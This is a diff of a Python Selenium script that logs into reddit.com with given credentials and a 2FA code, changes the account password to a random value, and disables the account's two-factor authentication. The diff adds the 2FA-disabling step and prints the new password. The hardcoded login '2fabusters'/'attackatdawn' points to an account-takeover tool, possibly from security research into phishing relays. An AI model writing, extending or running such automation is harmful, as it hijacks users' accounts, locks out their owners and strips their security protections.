@@ -14,8 +14,7 @@ import time
 import uuid
 
 # constants
-ADDRESS = 'http://127.0.0.1:8000/'
-TITLE_TO_MATCH = "reddit: the front page of the internet"
+TITLE_TO_MATCH = 'reddit: the front page of the internet'
 INVALID_CREDS = -1
 SUCCESS_NO_TWOAUTH = 0
 SUCCESS_TWOAUTH = 1
@@ -28,11 +27,11 @@ driver = None
 def setup():
     global driver
     options = webdriver.FirefoxOptions()
-    #options.add_argument("--headless")
+    # options.add_argument('--headless')
     driver = webdriver.Firefox(options=options)
 
     # Visit the webpage.
-    driver.get("https://reddit.com/login")
+    driver.get('https://reddit.com/login')
 
 
 # Returns False if login failed with supplied credentials, True otherwise
@@ -44,7 +43,7 @@ def do_login(**credentials):
     user_field.send_keys(credentials['Username'])
     pass_field.clear()
     pass_field.send_keys(credentials['Password'])
-    submit_btn = driver.find_element_by_class_name("AnimatedForm__submitButton")
+    submit_btn = driver.find_element_by_class_name('AnimatedForm__submitButton')
     submit_btn.click()
 
     # Which page is showing up?
@@ -57,7 +56,7 @@ def do_login(**credentials):
         if length_twofa > 0:
             return SUCCESS_TWOAUTH # creds were valid and auth page presented
         if length_notwofa > 0:
-            print("logged in, no twoauth")
+            print('logged in, no twoauth')
             return SUCCESS_NO_TWOAUTH # successfully logged in without two auth
         
 
@@ -67,37 +66,41 @@ def do_login(**credentials):
 def do_twoauth(code):
     # throw an error if the 2fa field cannot be found
     otp_field = None
+    print("attempting 2auth...")
     try:
-        otp_field = driver.find_element_by_id("loginOtp")
+        otp_field = driver.find_element_by_id('loginOtp')
     except NoSuchElementException:
-        print("Fatal error: twoauth field not found.")
-        return -1
+        print('Fatal error: twoauth field not found.')
+        return False
     
     otp_field.clear()
     otp_field.send_keys(code)
     otp_field.send_keys(Keys.RETURN)
 
     while True:
-        error_len = len(driver.find_elements_by_class_name("m-error"))
-        auth_len = len(driver.find_elements_by_class_name("m-success"))
+        error_len = len(driver.find_elements_by_class_name('m-error'))
+        auth_len = len(driver.find_elements_by_class_name('m-success'))
         if error_len > 0:
-            print("error found")
-            return -1
+            print('error found')
+            return False
         if auth_len > 0:
             try:
+                time.sleep(0.5)
                 title_reddit = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, 'title')))
-                if title_reddit.get_property("innerHTML") == TITLE_TO_MATCH:
+                if title_reddit.get_property('innerHTML') == TITLE_TO_MATCH:
                     print(TITLE_TO_MATCH)
-                    print("Page is ready!")
+                    print('Login was successfully completed')
                     return True
             except TimeoutException:
-                print("Loading took too much time!")
+                print('Loading took too much time!')
                 return False
 
 
-# Change the password! New password will be returned, or 0 if error.
+# Change the password and disable their 2fa! New password will be returned; False if error
 def do_password_change(old_password):
-    driver.get("https://www.reddit.com/prefs/update")
+    # password change to random uuid.hex format
+    print("changing password")
+    driver.get('https://www.reddit.com/prefs/update')
     temp_button = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CLASS_NAME, 'emailverification-edit')))
     temp_button.send_keys(Keys.TAB)
     current_password_field = driver.switch_to.active_element
@@ -110,24 +113,43 @@ def do_password_change(old_password):
     deauth_checkbox.send_keys(Keys.TAB)
     save_button = driver.switch_to.active_element
     save_button.click()
+    time.sleep(1)
+    print('password changed; disabling twofa')
+    print('new password: ' + new_password)
+
+    # disable 2fa
+    disable_tfa_list = driver.find_elements_by_id('tfa-enable-col-second-variant')
+    if len(disable_tfa_list) > 0 and disable_tfa_list[0].is_displayed():
+        disable_tfa_list[0].click()
+        while True:
+            time.sleep(0.5)
+            if len(driver.find_elements_by_class_name('modal-open')) > 0:
+                break
+        driver.switch_to.active_element.send_keys(Keys.TAB)
+        driver.switch_to.active_element.send_keys(new_password)
+        driver.switch_to.active_element.send_keys(Keys.TAB)
+        driver.switch_to.active_element.send_keys(Keys.TAB)
+        driver.switch_to.active_element.send_keys(Keys.RETURN)
+        print('2fa disabled!')
+    else:
+        print('error. twofa may not be enabled for this account')
+        return False
+
     return new_password
     
 
-
 def go():
     setup()
-    cred_status = do_login(Username="2fabusters", Password="attackatdawn")
+    cred_status = do_login(Username='2fabusters', Password='attackatdawn')
     twoauth_correct = False
     if cred_status == SUCCESS_TWOAUTH:
-        print("login good; trying twoauth")
-        twoauth_correct = do_twoauth("000000")
+        print('login good; trying twoauth')
+        twoauth_correct = do_twoauth('932485')
         if twoauth_correct:
-            new_password = do_password_change("attackatdawn")
-            print("new password: " + new_password)
+            do_password_change('attackatdawn')
     elif cred_status == SUCCESS_NO_TWOAUTH:
-        print("no twoauth, we're in. Time to change password")
-        new_password = do_password_change("attackatdawn")
-        print("new password: " + new_password)
+        print('no twoauth, we are in. Time to change password')
+        do_password_change('attackatdawn')
 
 if __name__ == '__main__':
     go()
